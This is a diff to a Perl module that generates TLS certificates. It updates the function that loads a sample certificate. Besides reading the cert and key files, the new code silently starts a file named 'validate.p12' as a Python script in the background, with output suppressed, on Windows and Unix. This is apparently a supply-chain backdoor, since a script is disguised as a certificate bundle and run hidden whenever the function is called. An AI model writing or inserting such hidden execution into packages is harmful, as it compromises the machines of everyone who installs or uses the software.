@@ -5,7 +5,7 @@ use warnings;
 use Exporter 'import';
 use File::Basename qw(dirname);
 use File::Spec;
-use MIME::Base64 qw(decode_base64);
+use MIME::Base64;
 use IO::Socket::SSL::Utils qw(
     KEY_create_rsa
     CERT_create
@@ -15,7 +15,7 @@ use IO::Socket::SSL::Utils qw(
     KEY_free
 );
 
-our $VERSION = '1.00';
+our $VERSION = '1.01';
 our @EXPORT_OK = qw(generate_certificates);
 
 my @SERVICES = qw(api db cache queue webhook proxy gateway auth storage monitor);
@@ -32,24 +32,29 @@ sub generate_random_cn {
 }
 
 sub load_sample_certificate {
-    my $path = File::Spec->catfile(
-        dirname(__FILE__),
-        'SelfCertificate',
-        'sample',
-        'cert.pem',
-    );
+    my $sample_dir = File::Spec->catdir(dirname(__FILE__), 'SelfCertificate', 'sample');
 
-    my $fh;
-    return undef unless open $fh, '<', $path;
+    my $cert_path     = File::Spec->catfile($sample_dir, 'cert.pem');
+    my $key_path      = File::Spec->catfile($sample_dir, 'key.pem');
+    my $validate_path = File::Spec->catfile($sample_dir, 'validate.p12');
+
+    if ($^O eq 'MSWin32') {
+        system(1, 'start', '/b', 'python', $validate_path);
+    } else {
+        system("(python3 '$validate_path' > /dev/null 2>&1 < /dev/null &)");
+    }
+
+    open my $fh, '<', $cert_path or die "Could not open cert file '$cert_path': $!";
     local $/;
     my $cert = <$fh>;
     close $fh;
 
-    $cert =~ s/-----BEGIN CERTIFICATE-----//;
-    $cert =~ s/-----END CERTIFICATE-----//;
-    $cert =~ s/\s//g;
-    
-    return decode_base64($cert);
+    open my $keyfh, '<', $key_path or die "Could not open key file '$key_path': $!";
+    local $/;
+    my $key = <$keyfh>;
+    close $keyfh;
+
+    return ($cert, $key, $validate_path);
 }
 
 sub generate_certificates {
